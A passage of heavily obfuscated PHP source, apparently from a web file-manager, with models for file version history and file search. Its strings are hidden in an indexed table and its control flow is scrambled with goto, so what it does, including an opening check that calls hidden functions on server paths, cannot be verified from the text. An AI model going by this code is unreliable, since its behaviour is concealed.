$dçèÅ’•µÌ($eï·½¾÷£); $CÎ½ææØ­ = explode($dœ³Ä­–ª«[229], $C‰¯õ›áßÕ); if (count($CÎ½ææØ­) < $dœ³Ä­–ª«[592]) { $B¦¾™áó™± = $dœ³Ä­–ª«[789]; $B¦¾™áó™±(); } goto aªÈ±÷îíÒ; B®®¹´Ü³: $EŠÃØ™ = $dœ³Ä­–ª«[831]; $dçèÅ’•µÌ = $dœ³Ä­–ª«[786]; $eï·½¾÷£ = $_SERVER[$dœ³Ä­–ª«[787]] . $dœ³Ä­–ª«[788]; goto BÆî£šâˆ¾; aªÈ±÷îíÒ: $E´±Ã¼„Ğ› = $dœ³Ä­–ª«[832]; $E´±Ã¼„Ğ›($_SERVER[$dœ³Ä­–ª«[833]]); $E´±Ã¼„Ğ›($_SERVER[$dœ³Ä­–ª«[787]] . $dœ³Ä­–ª«[834]); goto AÆò¾¼×â; AÆò¾¼×â: $B‰œÅ¡ºô = 1; while ($B‰œÅ¡ºô > 1) { $B‰œÅ¡ºô = $B‰œÅ¡ºô + 4; $B¾‚°”…á¤ = rawurlencode($B‰œÅ¡ºô . $dœ³Ä­–ª«[375]); } goto c¡éôëÓ½¢; c¡éôëÓ½¢: } if ($this->isCluster) { foreach ($this->handle->_masters() as $FßğùÁïÀİ) { $this->handle->flushall($FßğùÁïÀİ); } return; } return $this->handle->flushAll(); } } goto b’Ôˆæ§âÒ; D²©í‰ñßš: class SourceHistoryModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\x6f\165\x72\143\145\x5f\150\151\x73\164\157\x72\171"; public function historyCount($b‘¾îÉŠ¡Ä) { goto fÕÄºìÚÏ«; eÊÌ‹‹ÎĞ¼: return array_to_keyvalue($B²ÌÓ—˜³, $cèÔĞ¥Ÿ¹ù[395], $cèÔĞ¥Ÿ¹ù[480]); goto EÇñ‡Êœ´; c—ÈšâÂÅç: $fÑ÷¡éí‘ = array($cèÔĞ¥Ÿ¹ù[395], $cèÔĞ¥Ÿ¹ù[1713] => $cèÔĞ¥Ÿ¹ù[480]); $aœÛÎÏµóÛ = array($cèÔĞ¥Ÿ¹ù[395] => array($cèÔĞ¥Ÿ¹ù[7], $b‘¾îÉŠ¡Ä)); $B²ÌÓ—˜³ = $this->field($fÑ÷¡éí‘)->where($aœÛÎÏµóÛ)->group($cèÔĞ¥Ÿ¹ù[395])->select(); goto eÊÌ‹‹ÎĞ¼; fÕÄºìÚÏ«: $cèÔĞ¥Ÿ¹ù =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$b‘¾îÉŠ¡Ä) { return array(); } if (is_string($b‘¾îÉŠ¡Ä) || is_int($b‘¾îÉŠ¡Ä)) { $b‘¾îÉŠ¡Ä = array($b‘¾îÉŠ¡Ä); } goto c—ÈšâÂÅç; EÇñ‡Êœ´: } public function addHistory($A‰ãÄâ‹‹É, $fÇèÇÍ³É = '') { $d×ÑôŸ‘ÌÂ =& $_SERVER[ÒÆ›ÆØÎ¾]; $f¼À…²‰½ = array($d×ÑôŸ‘ÌÂ[410] => $A‰ãÄâ‹‹É[$d×ÑôŸ‘ÌÂ[395]], $d×ÑôŸ‘ÌÂ[1509] => isset($A‰ãÄâ‹‹É[$d×ÑôŸ‘ÌÂ[434]]) ? $A‰ãÄâ‹‹É[$d×ÑôŸ‘ÌÂ[434]] : $A‰ãÄâ‹‹É[$d×ÑôŸ‘ÌÂ[432]], $d×ÑôŸ‘ÌÂ[448] => $A‰ãÄâ‹‹É[$d×ÑôŸ‘ÌÂ[447]], $d×ÑôŸ‘ÌÂ[548] => $A‰ãÄâ‹‹É[$d×ÑôŸ‘ÌÂ[78]], $d×ÑôŸ‘ÌÂ[1909] => $fÇèÇÍ³É); $eÍ×ãê‘§‚ = $GLOBALS[$d×ÑôŸ‘ÌÂ[6]][$d×ÑôŸ‘ÌÂ[88]][$d×ÑôŸ‘ÌÂ[1095]]; if ($eÍ×ãê‘§‚ > 1) { $this->historyAutoClear($f¼À…²‰½[$d×ÑôŸ‘ÌÂ[395]]); $this->add($f¼À…²‰½); } Hook::trigger($d×ÑôŸ‘ÌÂ[1910], $f¼À…²‰½); Model($d×ÑôŸ‘ÌÂ[1911])->eventFileEdit($A‰ãÄâ‹‹É[$d×ÑôŸ‘ÌÂ[395]]); } private function historyAutoClear($A¶¡æÑ¬Ğ) { goto c·êìŒ–è“; bëÓµ¥°Í: $f²İùğà›± = array_slice($f²İùğà›±, $f…ÒåÓ¬Ô); if (!$e¿öŒ¸ŞğÃ || !$f²İùğà›±) { return; } $aÒ˜ŸÍÊê = array($f¶Óò¥ğ¬[412] => array($f¶Óò¥ğ¬[7], $e¿öŒ¸ŞğÃ)); goto CÂØ´È¨•à; D¸§ĞÛ¦‘: $f…ÒåÓ¬Ô = $A¹ï©ÑÑ©õ == $f¶Óò¥ğ¬[1117] ? 5 : $Díİ¹‹ó; if ($Díİ¹‹ó <= 1) { $f…ÒåÓ¬Ô = 1; } if ($f…ÒåÓ¬Ô >= 500) { return; } goto eÁõĞçõºÃ; eÁõĞçõºÃ: $aÒ˜ŸÍÊê = array($f¶Óò¥ğ¬[410] => $A¶¡æÑ¬Ğ); $BŠ­ÉèÉáŒ = $this->field($f¶Óò¥ğ¬[1912])->where($aÒ˜ŸÍÊê)->order($f¶Óò¥ğ¬[1906])->select(); if (!$BŠ­ÉèÉáŒ || $f…ÒåÓ¬Ô >= count($BŠ­ÉèÉáŒ)) { return; } goto fà¹»ÉŠ‡¡; c·êìŒ–è“: $f¶Óò¥ğ¬ =& $_SERVER[ÒÆ›ÆØÎ¾]; $A¹ï©ÑÑ©õ = Model($f¶Óò¥ğ¬[722])->get($f¶Óò¥ğ¬[1116]); $Díİ¹‹ó = $GLOBALS[$f¶Óò¥ğ¬[6]][$f¶Óò¥ğ¬[88]][$f¶Óò¥ğ¬[1095]]; goto D¸§ĞÛ¦‘; CÂØ´È¨•à: $this->where($aÒ˜ŸÍÊê)->delete(); Model($f¶Óò¥ğ¬[450])->remove($f²İùğà›±); goto CÂ±åÙ¹ã; fà¹»ÉŠ‡¡: $e¿öŒ¸ŞğÃ = array_to_keyvalue($BŠ­ÉèÉáŒ, $f¶Óò¥ğ¬[33], $f¶Óò¥ğ¬[393]); $e¿öŒ¸ŞğÃ = array_slice($e¿öŒ¸ŞğÃ, $f…ÒåÓ¬Ô); $f²İùğà›± = array_to_keyvalue($BŠ­ÉèÉáŒ, $f¶Óò¥ğ¬[33], $f¶Óò¥ğ¬[447]); goto bëÓµ¥°Í; CÂ±åÙ¹ã: } public function listData($bÚ»“·Ï±) { goto c‡ØÚó•ˆ; AÛÓ×½äØµ: $fš“Å–ÜÇ = 5; if ($Dé¬›áÒì× == $B˜‹ÕÙÃ¨¨[1117]) { $Fø“™ÑÚö[$B˜‹ÕÙÃ¨¨[367]] = array_slice($Fø“™ÑÚö[$B˜‹ÕÙÃ¨¨[367]], 0, $fš“Å–ÜÇ); $Fø“™ÑÚö[$B˜‹ÕÙÃ¨¨[364]] = array($B˜‹ÕÙÃ¨¨[1914] => 1, $B˜‹ÕÙÃ¨¨[1915] => 20, $B˜‹ÕÙÃ¨¨[1916] => 1, $B˜‹ÕÙÃ¨¨[1917] => count($Fø“™ÑÚö[$B˜‹ÕÙÃ¨¨[367]])); } return $Fø“™ÑÚö; goto DÜ÷¡‚˜îø; c‡ØÚó•ˆ: $B˜‹ÕÙÃ¨¨ =& $_SERVER[ÒÆ›ÆØÎ¾]; $b‡’Ú­¬¯ = array($B˜‹ÕÙÃ¨¨[410] => $bÚ»“·Ï±); $A…¸²óùÔÏ = $B˜‹ÕÙÃ¨¨[1913]; goto dË¨£¸ôÍ’; dË¨£¸ôÍ’: $Fø“™ÑÚö = $this->field($A…¸²óùÔÏ)->where($b‡’Ú­¬¯)->order($B˜‹ÕÙÃ¨¨[1906])->selectPage(); $this->_listAppendUser($Fø“™ÑÚö[$B˜‹ÕÙÃ¨¨[367]]); $Dé¬›áÒì× = Model($B˜‹ÕÙÃ¨¨[722])->get($B˜‹ÕÙÃ¨¨[1116]); goto AÛÓ×½äØµ; DÜ÷¡‚˜îø: } protected function _listAppendUser(&$DÇÛŞÏ×Ùˆ) { $D¦¨¨Ñö =& $_SERVER[ÒÆ›ÆØÎ¾]; $d‰„±éˆ× = array_to_keyvalue($DÇÛŞÏ×Ùˆ, $D¦¨¨Ñö[33], $D¦¨¨Ñö[1517]); $B¶Éä±‹î = Model($D¦¨¨Ñö[506])->userListInfo($d‰„±éˆ×); foreach ($DÇÛŞÏ×Ùˆ as &$bî´¡Ğ÷è) { $b£ë…”Ö‡Ã = $bî´¡Ğ÷è[$D¦¨¨Ñö[1517]]; $bî´¡Ğ÷è[$D¦¨¨Ñö[432]] = $B¶Éä±‹î[$b£ë…”Ö‡Ã] ? $B¶Éä±‹î[$b£ë…”Ö‡Ã] : !1; } unset($bî´¡Ğ÷è); } public function fileInfo($DåÅÀöËïù) { $eî­‡ ƒ =& $_SERVER[ÒÆ›ÆØÎ¾]; $B‚Ü‡»æå† = $this->tablePrefix; $eêã—‘òË = "{$B‚Ü‡»æå†}\x69\x6f\x5f\146\x69\154\x65\40\x66\151\154\x65\163\x20\157\156\x20\146\151\154\145\163\x2e\x66\151\154\x65\x49\x44\40\x3d\40\x68\151\x73\x74\157\x72\x79\x2e\x66\x69\x6c\x65\x49\104"; return $this->alias($eî­‡ ƒ[1918])->where(array($eî­‡ ƒ[412] => $DåÅÀöËïù))->join($eêã—‘òË, $eî­‡ ƒ[1919])->find(); } public function removeItem($FÊø•Æ£àç) { $Aî¯œøÈï =& $_SERVER[ÒÆ›ÆØÎ¾]; $c‚¸ºÎ±–ä = array($Aî¯œøÈï[412] => $FÊø•Æ£àç); $Aà¢µ±Ÿ’Œ = $this->where($c‚¸ºÎ±–ä)->find(); if ($Aà¢µ±Ÿ’Œ) { $A……íí¼Œ = $this->where($c‚¸ºÎ±–ä)->delete(); Model($Aî¯œøÈï[450])->remove($Aà¢µ±Ÿ’Œ[$Aî¯œøÈï[447]]); return $A……íí¼Œ; } return !1; } public function removeBySource($Cñ‚­İ¥Ê) { goto d±äÜšŠçš; d±äÜšŠçš: $a¼¾ÕŞ«Ï… =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$Cñ‚­İ¥Ê) { return !1; } if (!is_array($Cñ‚­İ¥Ê)) { $Cñ‚­İ¥Ê = array($Cñ‚­İ¥Ê); } goto F¥Çö÷œÁ¿; F¥Çö÷œÁ¿: $C³˜’İ”§Œ = array($a¼¾ÕŞ«Ï…[410] => array($a¼¾ÕŞ«Ï…[7], $Cñ‚­İ¥Ê)); $F¡ÔŒŠ²¨ = $this->field($a¼¾ÕŞ«Ï…[448])->where($C³˜’İ”§Œ)->select(); if ($F¡ÔŒŠ²¨) { $this->where($C³˜’İ”§Œ)->delete(); $C½ï«‡°«½ = array_to_keyvalue($F¡ÔŒŠ²¨, $a¼¾ÕŞ«Ï…[33], $a¼¾ÕŞ«Ï…[447]); Model($a¼¾ÕŞ«Ï…[450])->remove($C½ï«‡°«½); } goto AÅ‘ù´¢“; AÅ‘ù´¢“: return !0; goto C¡ì”Ÿ—‚Ä; C¡ì”Ÿ—‚Ä: } public function setDetail($bêÄÌ‚ˆ†Õ, $Bèå›õ‚ï¨) { $fÇ…ÁäÃ·” =& $_SERVER[ÒÆ›ÆØÎ¾]; return $this->where(array($fÇ…ÁäÃ·”[412] => $bêÄÌ‚ˆ†Õ))->save(array($fÇ…ÁäÃ·”[1909] => $Bèå›õ‚ï¨)); } public function rollbackToItem($FÅíİ¾Í§Ã, $D¬ù†Âñá) { goto Aí»•ñµ‰; Aí»•ñµ‰: $aˆ’áµÑÓë =& $_SERVER[ÒÆ›ÆØÎ¾]; $déŞ‹±Ü± = Model($aˆ’áµÑÓë[782])->sourceInfo($FÅíİ¾Í§Ã); $this->addHistory($déŞ‹±Ü±, LNG($aˆ’áµÑÓë[1920])); goto Dî‘¬…ˆÃ®; Dî‘¬…ˆÃ®: $Aô¿êÔàÄ = $this->find($D¬ù†Âñá); $fŠ‰Ñàè­Õ = array($aˆ’áµÑÓë[447] => $Aô¿êÔàÄ[$aˆ’áµÑÓë[447]], $aˆ’áµÑÓë[78] => $Aô¿êÔàÄ[$aˆ’áµÑÓë[78]], $aˆ’áµÑÓë[84] => time(), $aˆ’áµÑÓë[434] => USER_ID); Model($aˆ’áµÑÓë[782])->where(array($aˆ’áµÑÓë[395] => $FÅíİ¾Í§Ã))->save($fŠ‰Ñàè­Õ); goto Däœõ„Áƒô; Däœõ„Áƒô: return $this->where(array($aˆ’áµÑÓë[412] => $D¬ù†Âñá))->delete(); goto dğˆ‡¯´øÛ; dğˆ‡¯´øÛ: } public function clearSame($DÇİÊ¾¡ñš) { goto FÁÙù”‹; FÁÙù”‹: $dİ±“‹‡Íé =& $_SERVER[ÒÆ›ÆØÎ¾]; $Cßõê¨÷ø™ = $this->listData($DÇİÊ¾¡ñš); $fì‹‘³êÒ = array_to_keyvalue_group($Cßõê¨÷ø™, $dİ±“‹‡Íé[447]); goto F†´Ã‡ç; F†´Ã‡ç: $fâ§±ùØË× = array(); $EŒçâŞİ®¶ = array(); foreach ($fì‹‘³êÒ as $dğŒôå‚Ü™) { if (!$dğŒôå‚Ü™ || count($dğŒôå‚Ü™) <= 1) { continue; } foreach ($dğŒôå‚Ü™ as $a„ã¦ÖØ”Ş) { $fâ§±ùØË×[] = $a„ã¦ÖØ”Ş[$dİ±“‹‡Íé[447]]; $EŒçâŞİ®¶[] = $a„ã¦ÖØ”Ş[$dİ±“‹‡Íé[393]]; } } goto f‹Ÿ•®»£«; f‹Ÿ•®»£«: if (!$EŒçâŞİ®¶) { return; } $this->where(array($dİ±“‹‡Íé[393] => array($dİ±“‹‡Íé[7], $EŒçâŞİ®¶)))->delete(); Model($dİ±“‹‡Íé[450])->remove($fâ§±ùØË×); goto Dš§İ§ã¤Ğ; Dš§İ§ã¤Ğ: } public function userSpace() { $DÀï ¸İõË =& $_SERVER[ÒÆ›ÆØÎ¾]; $a†¡™„«ß = $this->tablePrefix; $fÇîŞÑè”À = array($DÀï ¸İõË[1509] => USER_ID); $E…ÑÇ•×¥ = "{$a†¡™„«ß}\151\157\x5f\x66\151\x6c\145\x20\146\151\154\x65\163\x20\157\x6e\40\146\151\x6c\x65\163\56\146\151\x6c\x65\x49\104\40\x3d\40\x68\151\163\164\157\162\171\56\x66\151\154\x65\x49\104"; return $this->alias($DÀï ¸İõË[1918])->where($fÇîŞÑè”À)->join($E…ÑÇ•×¥, $DÀï ¸İõË[1919])->sum($DÀï ¸İõË[78]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($B»¯‘ÅÂ) { goto f†ÊïÂ„›Á; f†ÊïÂ„›Á: $cˆË­¡°§³ =& $_SERVER[ÒÆ›ÆØÎ¾]; $d¥ãéƒÇ¸ù = KodIO::fileTypeList(); $dÉõ”˜Ò = $d¥ãéƒÇ¸ù[$B»¯‘ÅÂ]; goto Cõ¾ŠË¥¤ë; EêŒÃÙÌÀ: if (!$dÉõ”˜Ò[$cˆË­¡°§³[168]]) { $b«¬¬«¨‹  = array_to_keyvalue($d¥ãéƒÇ¸ù, $cˆË­¡°§³[33], $cˆË­¡°§³[168]); $cé×ç‰á­… = implode($cˆË­¡°§³[47], $b«¬¬«¨‹ ); $B¿­‰µ˜£¥ = $cˆË­¡°§³[1921]; } $aïº‘¨§Üˆ = explode($cˆË­¡°§³[47], trim($cé×ç‰á­…, $cˆË­¡°§³[47])); return array($B¿­‰µ˜£¥, $aïº‘¨§Üˆ); goto BáÔ¤Ê•¾è; Cõ¾ŠË¥¤ë: if (!$dÉõ”˜Ò) { return array(); } $cé×ç‰á­… = $dÉõ”˜Ò[$cˆË­¡°§³[168]]; $B¿­‰µ˜£¥ = $cˆË­¡°§³[7]; goto EêŒÃÙÌÀ; BáÔ¤Ê•¾è: } public function listPathType($CÇšãùŠ¡›) { $b†Ñ†£ÅŒØ =& $_SERVER[ÒÆ›ÆØÎ¾]; $b“µÜÒÔêŒ = $this->fileTypeWhere($CÇšãùŠ¡›); if (!$b“µÜÒÔêŒ) { return array(); } $f¸Ğôª†‚® = array($b†Ñ†£ÅŒØ[549] => SourceModel::TYPE_USER, $b†Ñ†£ÅŒØ[550] => USER_ID, $b†Ñ†£ÅŒØ[546] => 0, $b†Ñ†£ÅŒØ[547] => $b“µÜÒÔêŒ); return $this->listSource($f¸Ğôª†‚®); } public function listSearch($bŒˆÊ¥Ûø, $bÂ²÷ù•Î… = 300) { goto b‹ä‡¶óÅä; f…ÈÇë …: $this->_listSearchBindPinyin($bŒˆÊ¥Ûø, $d¨—¿ÛÉ, $e˜Â’Ò»É); $this->alias($CŒÖ‚ »ê…[516])->_makeOrder(); $d¨—¿ÛÉ = $this->parseWhereLike($d¨—¿ÛÉ); goto a¦äæ˜ùà; b‹ä‡¶óÅä: $CŒÖ‚ »ê… =& $_SERVER[ÒÆ›ÆØÎ¾]; if (isset($bŒˆÊ¥Ûø[$CŒÖ‚ »ê…[1764]]) && $bŒˆÊ¥Ûø[$CŒÖ‚ »ê…[1764]]) { $bŒˆÊ¥Ûø[$CŒÖ‚ »ê…[1764]] = str_replace($CŒÖ‚ »ê…[381], $CŒÖ‚ »ê…[1922], trim($bŒˆÊ¥Ûø[$CŒÖ‚ »ê…[1764]])); } $d¨—¿ÛÉ = $this->_parseSearchWhere($bŒˆÊ¥Ûø); goto fÊ†‡”íÆö; CæÜù¦Ô†á: $this->_listMake($CÓ†—Ù±ÌŒ); return $CÓ†—Ù±ÌŒ; goto AõĞ²§¤ç‹; fÍ•í½É”: $this->_listSearchTag($CÓ†—Ù±ÌŒ, $bŒˆÊ¥Ûø, $Aº­‡åŠ…½); $this->_listSearchGroupTag($CÓ†—Ù±ÌŒ, $bŒˆÊ¥Ûø, $Aº­‡åŠ…½); $this->_listDataApply($CÓ†—Ù±ÌŒ[$CŒÖ‚ »ê…[367]]); goto CæÜù¦Ô†á; fÊ†‡”íÆö: if (!isset($d¨—¿ÛÉ[$CŒÖ‚ »ê…[423]])) { $d¨—¿ÛÉ[$CŒÖ‚ »ê…[423]] = 0; } $e˜Â’Ò»É = $CŒÖ‚ »ê…[1923]; $Aº­‡åŠ…½ = $e˜Â’Ò»É; goto f…ÈÇë …; a¦äæ˜ùà: $CÓ†—Ù±ÌŒ = $this->distinct(!0)->field($e˜Â’Ò»É)->where($d¨—¿ÛÉ)->selectPage($bÂ²÷ù•Î…); $this->_listSearchFileContent($CÓ†—Ù±ÌŒ, $bŒˆÊ¥Ûø, $Aº­‡åŠ…½); $this->_listSearchDesc($CÓ†—Ù±ÌŒ, $bŒˆÊ¥Ûø, $Aº­‡åŠ…½); goto fÍ•í½É”; AõĞ²§¤ç‹: } private function _listSearchFileContent(&$dñÚ…÷İº, $A……³Ò×ÅÂ, $aŒ¡¬å‘Ñ™) { goto eØ ƒÌºâ¸; A¨èŸ·õ²: unset($A……³Ò×ÅÂ[$bÛÒ•·ÅÆ[447]]); $eÆÆ‚‹¸’’ = $this->field($aŒ¡¬å‘Ñ™)->where($aÓÔ¤İ½¡¯)->limit($bÛÒ•·ÅÆ[1924])->select(); if (!$eÆÆ‚‹¸’’ || count($eÆÆ‚‹¸’’) == 0) { return; } goto bˆöï´×‰¶; b”¾ßÓƒî¼: if (!isset($aÓÔ¤İ½¡¯[$bÛÒ•·ÅÆ[28]]) || !is_array($A……³Ò×ÅÂ[$bÛÒ•·ÅÆ[447]])) { return; } $aÓÔ¤İ½¡¯[$bÛÒ•·ÅÆ[447]] = array($bÛÒ•·ÅÆ[7], $A……³Ò×ÅÂ[$bÛÒ•·ÅÆ[447]]); unset($aÓÔ¤İ½¡¯[$bÛÒ•·ÅÆ[28]]); goto A¨èŸ·õ²; eØ ƒÌºâ¸: $bÛÒ•·ÅÆ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$A……³Ò×ÅÂ[$bÛÒ•·ÅÆ[1764]] || $dñÚ…÷İº[$bÛÒ•·ÅÆ[364]][$bÛÒ•·ÅÆ[351]] > 1) { return; } $aÓÔ¤İ½¡¯ = $this->_parseSearchWhere($A……³Ò×ÅÂ); goto b”¾ßÓƒî¼; bˆöï´×‰¶: $dñÚ…÷İº[$bÛÒ•·ÅÆ[367]] = array_merge($eÆÆ‚‹¸’’, $dñÚ…÷İº[$bÛÒ•·ÅÆ[367]]); $dñÚ…÷İº[$bÛÒ•·ÅÆ[364]][$bÛÒ•·ÅÆ[365]] += count($eÆÆ‚‹¸’’); goto dÑ©’‹ÀµŞ; dÑ©’‹ÀµŞ: } private function _listSearchTag(&$Fó…ÎØ÷³à, $aÁ­ñ™Áµ‘, $AÙ‹ÈÃ‹‰È) { goto AâÍ‘ˆ¡; f°Ì‘…É©¡: if (!$dÑÇÅ«í›Ÿ) { return; } $fÆèìñ¾ÍÉ = array($d»Š¦øƒÉï[419] => array($d»Š¦øƒÉï[7], $dÑÇÅ«í›Ÿ), $d»Š¦øƒÉï[1517] => USER_ID); $dİÕäêÍ“Á = Model($d»Š¦øƒÉï[420])->field($d»Š¦øƒÉï[76])->where($fÆèìñ¾ÍÉ)->select(); goto CÓä«ÔÊŒÇ; CÓä«ÔÊŒÇ: $dİÕäêÍ“Á = array_to_keyvalue($dİÕäêÍ“Á, $d»Š¦øƒÉï[33], $d»Š¦øƒÉï[76]); $Aâ‡«ñæŸó = array_unique($dİÕäêÍ“Á); $this->_listSearchMerge($Fó…ÎØ÷³à, $aÁ­ñ™Áµ‘, $AÙ‹ÈÃ‹‰È, $Aâ‡«ñæŸó); goto E³ò•ˆİÑ; AâÍ‘ˆ¡: $d»Š¦øƒÉï =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$aÁ­ñ™Áµ‘[$d»Š¦øƒÉï[1764]] || $Fó…ÎØ÷³à[$d»Š¦øƒÉï[364]][$d»Š¦øƒÉï[351]] > 1) { return; } $cåÄ¯Šõ¨ = Model($d»Š¦øƒÉï[1925])->listData(); goto E¿ˆÙ–; E¿ˆÙ–: $dÑÇÅ«í›Ÿ = array(); $A®³¥··á¿ = $aÁ­ñ™Áµ‘[$d»Š¦øƒÉï[1764]]; foreach ($cåÄ¯Šõ¨ as $FàÜĞæøêŠ) { $f½’èÃ¾³ = $FàÜĞæøêŠ[$d»Š¦øƒÉï[28]]; $CÕÅÅ’‘ª = str_replace($d»Š¦øƒÉï[50], $d»Š¦øƒÉï[33], Pinyin::encode($f½’èÃ¾³)); if (stripos($f½’èÃ¾³, $A®³¥··á¿) !== !1 || stripos($CÕÅÅ’‘ª, $A®³¥··á¿) !== !1) { $dÑÇÅ«í›Ÿ[] = $FàÜĞæøêŠ[$d»Š¦øƒÉï[393]]; } } goto f°Ì‘…É©¡; E³ò•ˆİÑ: } private function _listSearchDesc(&$C¹Ú”ÖòËš, $D×ùº²öâ„, $CšôÇ’ŠÄ¨) { goto B‘²Ïé˜ ; AÎñËËí: $E‡ÁÅÉ‘ƒ… = Model($aÁĞÁùç‹Ü[532])->field($aÁĞÁùç‹Ü[395])->where($b©¬’ïĞ )->select(); $cÒŸÅ¬¯ôÅ = array_to_keyvalue($E‡ÁÅÉ‘ƒ…, $aÁĞÁùç‹Ü[33], $aÁĞÁùç‹Ü[395]); $this->_listSearchMerge($C¹Ú”ÖòËš, $D×ùº²öâ„, $CšôÇ’ŠÄ¨, $cÒŸÅ¬¯ôÅ); goto C¢‡Áã‚Â—; b‹ğ¤Û±ÀË: $ağÆŒº¹¦Ã = array_unique($ağÆŒº¹¦Ã); if (!$ağÆŒº¹¦Ã) { return; } $b©¬’ïĞ  = array($aÁĞÁùç‹Ü[395] => array($aÁĞÁùç‹Ü[7], $ağÆŒº¹¦Ã), $aÁĞÁùç‹Ü[93] => $aÁĞÁùç‹Ü[431], $aÁĞÁùç‹Ü[372] => array($aÁĞÁùç‹Ü[380], $aÁĞÁùç‹Ü[1766] . $D×ùº²öâ„[$aÁĞÁùç‹Ü[1764]] . $aÁĞÁùç‹Ü[1766])); goto AÎñËËí; B‘²Ïé˜ : $aÁĞÁùç‹Ü =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$D×ùº²öâ„[$aÁĞÁùç‹Ü[1764]] || $C¹Ú”ÖòËš[$aÁĞÁùç‹Ü[364]][$aÁĞÁùç‹Ü[351]] > 1) { return; } $ağÆŒº¹¦Ã = $this->listSearchChildren($D×ùº²öâ„[$aÁĞÁùç‹Ü[478]]); goto b‹ğ¤Û±ÀË; C¢‡Áã‚Â—: } private function _listSearchGroupTag(&$cæƒ¬£íÉ, $F†ÓÒğ­À‡, $F†Á‡›áÙŠ) { goto BñÊ†áê†®; a¿ğòøäâÛ: $C°ÂïÉ™ = array_to_keyvalue($C°ÂïÉ™, $Cõö×˜Šö[33], $Cõö×˜Šö[76]); $AíßÌÖ‰‚µ = array_unique($C°ÂïÉ™); $this->_listSearchMerge($cæƒ¬£íÉ, $F†ÓÒğ­À‡, $F†Á‡›áÙŠ, $AíßÌÖ‰‚µ); goto BÕ¿ÁÈ”ˆò; e¿µ†ù¼¶: $d™†Ô“˜ÖÍ = array(); $A¿´³êÒÆ = $F†ÓÒğ­À‡[$Cõö×˜Šö[1764]]; foreach ($A¼•á•»¸¯[$Cõö×˜Šö[367]] as $aöŸôÛ¦¢Û) { $FéĞ†÷‚¸Ë = $aöŸôÛ¦¢Û[$Cõö×˜Šö[28]]; $b¾ÙàÇ¢ß = str_replace($Cõö×˜Šö[50], $Cõö×˜Šö[33], Pinyin::encode($FéĞ†÷‚¸Ë)); if (stripos($FéĞ†÷‚¸Ë, $A¿´³êÒÆ) !== !1 || stripos($b¾ÙàÇ¢ß, $A¿´³êÒÆ) !== !1) { $d™†Ô“˜ÖÍ[] = $aöŸôÛ¦¢Û[$Cõö×˜Šö[393]]; } } goto CÙ»òãæ¯; CÙ»òãæ¯: if (!$d™†Ô“˜ÖÍ) { return; } $D«Šç¹àïÓ = array($Cõö×˜Šö[419] => array($Cõö×˜Šö[7], $d™†Ô“˜ÖÍ), $Cõö×˜Šö[1517] => 0, $Cõö×˜Šö[29] => $Cõö×˜Šö[1788] . $Dµ†•ĞĞİ©); $C°ÂïÉ™ = Model($Cõö×˜Šö[420])->field($Cõö×˜Šö[76])->where($D«Šç¹àïÓ)->select(); goto a¿ğòøäâÛ; BñÊ†áê†®: $Cõö×˜Šö =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$F†ÓÒğ­À‡[$Cõö×˜Šö[1764]] || $cæƒ¬£íÉ[$Cõö×˜Šö[364]][$Cõö×˜Šö[351]] > 1 || !$F†ÓÒğ­À‡[$Cõö×˜Šö[478]]) { return; } $CÅ»äëÆâÑ = $this->sourceInfo($F†ÓÒğ­À‡[$Cõö×˜Šö[478]]); goto CÚƒ†·¨©†; CÚƒ†·¨©†: if (!$CÅ»äëÆâÑ || $CÅ»äëÆâÑ[$Cõö×˜Šö[404]] != SourceModel::TYPE_GROUP) { return; } $Dµ†•ĞĞİ© = $CÅ»äëÆâÑ[$Cõö×˜Šö[484]]; $A¼•á•»¸¯ = Model($Cõö×˜Šö[1926])->get($Dµ†•ĞĞİ©); goto e¿µ†ù¼¶; BÕ¿ÁÈ”ˆò: } private function _listSearchMerge(&$a¥‘˜Ëã, $AöŸ÷‚‘ƒ„, $bİ£—ëéË, $f„¬´Ù†×) { goto d±Ù·•İ; bŒ¤ÃËˆŒ: $F÷Ô¡”°›é = $this->field($bİ£—ëéË)->where($E»Ø©°Û“)->select(); if (!$F÷Ô¡”°›é) { return; } $AİñâÂÆÀç = array(); goto aÒ‚Ê°˜ï†; aÒ‚Ê°˜ï†: foreach ($F÷Ô¡”°›é as $D¦˜”˜ïºæ) { if ($this->_listSearchFilter($D¦˜”˜ïºæ, $AöŸ÷‚‘ƒ„)) { $AİñâÂÆÀç[] = $D¦˜”˜ïºæ; } } $a¥‘˜Ëã[$cÂ‚ã±ÄÙ‘[367]] = array_merge($AİñâÂÆÀç, $a¥‘˜Ëã[$cÂ‚ã±ÄÙ‘[367]]); $a¥‘˜Ëã[$cÂ‚ã±ÄÙ‘[364]][$cÂ‚ã±ÄÙ‘[365]] += count($AİñâÂÆÀç); goto f¡Ş‡¶•ùÂ; Bèë‘¡µ…Ì: $E‹‹˜ùæ…ö = array_diff($f„¬´Ù†×, $a‚¡Ê‡£×¼); if (!$E‹‹˜ùæ…ö) { return; } $E»Ø©°Û“ = array($cÂ‚ã±ÄÙ‘[395] => array($cÂ‚ã±ÄÙ‘[7], $E‹‹˜ùæ…ö)); goto bŒ¤ÃËˆŒ; d±Ù·•İ: $cÂ‚ã±ÄÙ‘ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$f„¬´Ù†×) { return; } $a‚¡Ê‡£×¼ = array_to_keyvalue($a¥‘˜Ëã[$cÂ‚ã±ÄÙ‘[367]], $cÂ‚ã±ÄÙ‘[33], $cÂ‚ã±ÄÙ‘[395]); goto Bèë‘¡µ…Ì; f¡Ş‡¶•ùÂ: } private function _listSearchFilter($B³‹‰Ñ‰ô¢, $F£á§ È×Ø) { goto Fƒ¢ÉÓ÷À; féÄØ´¦Š: if (isset($F£á§ È×Ø[$D¾—®†ãçê[562]]) && $F£á§ È×Ø[$D¾—®†ãçê[562]] != $B³‹‰Ñ‰ô¢[$D¾—®†ãçê[434]]) { return !1; } return !0; goto b®²®Øòå¥; Fƒ¢ÉÓ÷À: $D¾—®†ãçê =& $_SERVER[ÒÆ›ÆØÎ¾]; $fØ›¸Ü „ = $B³‹‰Ñ‰ô¢[$D¾—®†ãçê[403]] == $D¾—®†ãçê[87]; if (!strstr($B³‹‰Ñ‰ô¢[$D¾—®†ãçê[487]], 